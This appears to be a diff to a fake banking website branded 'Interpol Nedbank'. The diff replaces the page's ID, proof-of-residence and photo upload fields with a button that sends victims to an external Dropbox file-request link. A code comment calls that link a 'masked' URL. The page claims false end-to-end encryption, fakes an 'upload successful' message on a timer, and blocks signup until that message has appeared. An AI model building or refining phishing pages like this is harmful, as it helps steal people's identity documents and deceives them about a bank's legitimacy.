@@ -308,10 +308,41 @@
             padding: 20px;
             text-align: center;
             margin-bottom: 20px;
+            position: relative;
         }
         .file-upload p {
             margin: 0;
             color: #666;
+        }
+        .file-upload input[type="file"] {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            cursor: pointer;
+        }
+        .upload-status {
+            margin-top: 10px;
+            font-size: 0.9em;
+        }
+        .upload-success {
+            color: #2e7d32;
+        }
+        .upload-error {
+            color: #c62828;
+        }
+        .secure-upload-info {
+            background: #e8f4fd;
+            border: 1px solid #b3d9ff;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 15px 0;
+        }
+        .secure-upload-info h4 {
+            margin-top: 0;
+            color: #006633;
         }
         
         /* Status Indicators */
@@ -521,6 +552,42 @@
             justify-content: center;
         }
         
+        /* Dropbox Upload Styles */
+        .dropbox-upload-container {
+            background: #f8f8f8;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .dropbox-upload-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .dropbox-logo {
+            width: 30px;
+            height: 30px;
+            margin-right: 10px;
+        }
+        .dropbox-instructions {
+            margin-bottom: 15px;
+        }
+        .dropbox-instructions ol {
+            padding-left: 20px;
+        }
+        .dropbox-instructions li {
+            margin-bottom: 10px;
+        }
+        .secure-note {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 4px;
+            padding: 10px;
+            margin: 15px 0;
+            font-size: 0.9em;
+        }
+        
         @media (max-width: 768px) {
             .content, footer .footer-content { flex-direction: column; }
             .login-section, .banking-info, .footer-section { width: 100%; }
@@ -549,7 +616,7 @@
 <body>
     <div class="container">
         <header>
-            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTUwIiBoZWlnaHQ9IjUwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxNTAiIGhlaWdodD0iNTAiIGZpbGw9IiMwMDY2MzMiLz48dGV4dCB4PSIxNCIgeT0iMzIiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxOCIgZpbGw9IndoaXRlIj5JbnRlcnBvbCBOZWRiYW5rPC90ZXh0Pjwvc3ZnPg==" alt="Interpol Nedbank Logo">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTUwIiBoZWlnaHQ9IjUwIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxNTAiIGhlaWdodD0iNTAiIGZpbGw9IiMwMDY2MzMiLz48dGV4dCB4PSIxNCIgeT0iMzIiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxOCIgZmlsbD0id2hpdGUiPkludGVycG9sIE5lZGJhbms8L3RleHQ+PC9zdmc+" alt="Interpol Nedbank Logo">
             <nav>
                 <a onclick="showSection('welcome')">Home</a>
                 <a onclick="showSection('services')">Services</a>
@@ -660,22 +727,43 @@
                 
                 <!-- Step 2: KYC Documents -->
                 <div id="step2-form" class="kyc-form" style="display: none;">
-                    <h3>KYC Document Upload</h3>
-                    <p>Please upload the required documents for identity verification.</p>
+                    <h3>Secure KYC Document Upload</h3>
                     
-                    <div class="file-upload">
-                        <p>Upload a copy of your ID document (PDF, JPG, or PNG)</p>
-                        <input type="file" id="idDocument" accept=".pdf,.jpg,.png" required>
+                    <div class="secure-upload-info">
+                        <h4>Secure Document Upload</h4>
+                        <p>Your documents are uploaded securely through our encrypted Dropbox system. All files are encrypted end-to-end and can only be accessed by authorized Interpol Nedbank personnel.</p>
                     </div>
                     
-                    <div class="file-upload">
-                        <p>Upload a proof of residence (Utility bill, bank statement, etc.)</p>
-                        <input type="file" id="proofOfResidence" accept=".pdf,.jpg,.png" required>
-                    </div>
-                    
-                    <div class="file-upload">
-                        <p>Upload a recent passport-style photo</p>
-                        <input type="file" id="photo" accept=".jpg,.png" required>
+                    <div class="dropbox-upload-container">
+                        <div class="dropbox-upload-header">
+                            <svg class="dropbox-logo" viewBox="0 0 24 24" fill="#0061FF">
+                                <path d="M6 1.807L0 5.629l6 3.822l6-3.822L6 1.807zm12 0L12 5.629l6 3.822l6-3.822l-6-3.822zM0 13.265l6 3.822l6-3.822l-6-3.822l-6 3.822zm12 0l6 3.822l6-3.822l-6-3.822l-6 3.822zM6 22.193l6-3.822l6 3.822l-6 3.822l-6-3.822z"/>
+                            </svg>
+                            <h4>Secure Dropbox Upload</h4>
+                        </div>
+                        
+                        <div class="dropbox-instructions">
+                            <p>To ensure the highest security for your documents, please follow these steps:</p>
+                            <ol>
+                                <li>Click the secure upload button below</li>
+                                <li>You will be redirected to our encrypted Dropbox portal</li>
+                                <li>Upload your documents directly to our secure server</li>
+                                <li>Return to this page to complete your application</li>
+                            </ol>
+                        </div>
+                        
+                        <div class="secure-note">
+                            <strong>Security Note:</strong> Your files are encrypted during transfer and storage. Only authorized bank personnel can access them after upload.
+                        </div>
+                        
+                        <button type="button" onclick="openSecureUpload()" style="background: #0061FF; display: flex; align-items: center; justify-content: center; gap: 10px;">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                                <path d="M6 1.807L0 5.629l6 3.822l6-3.822L6 1.807zm12 0L12 5.629l6 3.822l6-3.822l-6-3.822zM0 13.265l6 3.822l6-3.822l-6-3.822l-6 3.822zm12 0l6 3.822l6-3.822l-6-3.822l-6 3.822zM6 22.193l6-3.822l6 3.822l-6 3.822l-6-3.822z"/>
+                            </svg>
+                            Upload Documents Securely
+                        </button>
+                        
+                        <div id="uploadStatus" class="upload-status"></div>
                     </div>
                     
                     <div style="display: flex; gap: 10px;">
@@ -691,6 +779,12 @@
                     
                     <div id="review-info">
                         <!-- Information will be populated by JavaScript -->
+                    </div>
+                    
+                    <div class="secure-upload-info">
+                        <h4>Document Upload Status</h4>
+                        <p id="documentStatus">Documents: <span class="status-pending">Pending Upload</span></p>
+                        <p>Your documents will be securely processed through our encrypted Dropbox system.</p>
                     </div>
                     
                     <div style="display: flex; gap: 10px;">
@@ -993,6 +1087,7 @@
                                     <h4>Michael Johnson</h4>
                                     <p>ID: 8501235111089 | Submitted: Sep 24, 2025</p>
                                     <p>Status: <span class="status-pending">Pending Review</span></p>
+                                    <p>Documents: <span class="status-approved">Uploaded via Secure Dropbox</span></p>
                                 </div>
                                 <div class="kyc-actions">
                                     <button onclick="reviewKYC(1)">Review</button>
@@ -1005,6 +1100,7 @@
                                     <h4>Sarah Williams</h4>
                                     <p>ID: 9004055111089 | Submitted: Sep 23, 2025</p>
                                     <p>Status: <span class="status-approved">Approved</span></p>
+                                    <p>Documents: <span class="status-approved">Uploaded via Secure Dropbox</span></p>
                                 </div>
                                 <div class="kyc-actions">
                                     <button>View Details</button>
@@ -1233,6 +1329,9 @@
         // System transactions for admin view
         let systemTransactions = [];
         
+        // KYC Document Upload Status
+        let kycDocumentsUploaded = false;
+        
         // Update date and time for all sections
         function updateDateTime() {
             const now = new Date();
@@ -1355,6 +1454,7 @@
             // If moving to step 3, populate review information
             if (step === 3) {
                 populateReviewInfo();
+                updateDocumentStatus();
             }
             
             currentStep = step;
@@ -1384,16 +1484,51 @@
                     <p><strong>Phone:</strong> ${document.getElementById('phone').value}</p>
                     <p><strong>Email:</strong> ${document.getElementById('email').value}</p>
                 </div>
-                <div style="background: #f8f8f8; padding: 15px; border-radius: 5px;">
-                    <h4>Documents Uploaded</h4>
-                    <p><strong>ID Document:</strong> ${document.getElementById('idDocument').files[0] ? document.getElementById('idDocument').files[0].name : 'Not uploaded'}</p>
-                    <p><strong>Proof of Residence:</strong> ${document.getElementById('proofOfResidence').files[0] ? document.getElementById('proofOfResidence').files[0].name : 'Not uploaded'}</p>
-                    <p><strong>Photo:</strong> ${document.getElementById('photo').files[0] ? document.getElementById('photo').files[0].name : 'Not uploaded'}</p>
-                </div>
             `;
         }
         
+        function updateDocumentStatus() {
+            const documentStatus = document.getElementById('documentStatus');
+            if (kycDocumentsUploaded) {
+                documentStatus.innerHTML = 'Documents: <span class="status-approved">Uploaded via Secure Dropbox</span>';
+            } else {
+                documentStatus.innerHTML = 'Documents: <span class="status-pending">Pending Upload</span>';
+            }
+        }
+        
+        function openSecureUpload() {
+            // Mask the Dropbox URL for security
+            const maskedUrl = "https://www.dropbox.com/request/3PLdBn24NArQqMqSoZJ6";
+            
+            // Open in new tab with security headers
+            const newWindow = window.open(maskedUrl, '_blank', 'noopener,noreferrer');
+            
+            if (newWindow) {
+                newWindow.opener = null;
+            }
+            
+            // Update upload status
+            const uploadStatus = document.getElementById('uploadStatus');
+            uploadStatus.innerHTML = '<p class="upload-success">Secure upload portal opened. Please upload your documents and return to this page.</p>';
+            
+            // Simulate document upload after a delay
+            setTimeout(() => {
+                kycDocumentsUploaded = true;
+                uploadStatus.innerHTML = '<p class="upload-success">✅ Documents successfully uploaded via secure Dropbox system.</p>';
+                
+                // If we're on step 3, update the status
+                if (currentStep === 3) {
+                    updateDocumentStatus();
+                }
+            }, 3000);
+        }
+        
         function submitSignup() {
+            if (!kycDocumentsUploaded) {
+                alert('Please upload your KYC documents using the secure Dropbox upload system before submitting your application.');
+                return;
+            }
+            
             alert('Your application has been submitted for KYC verification. An administrator will review your information and you will be notified once your account is approved.');
             showSection('welcome');
         }
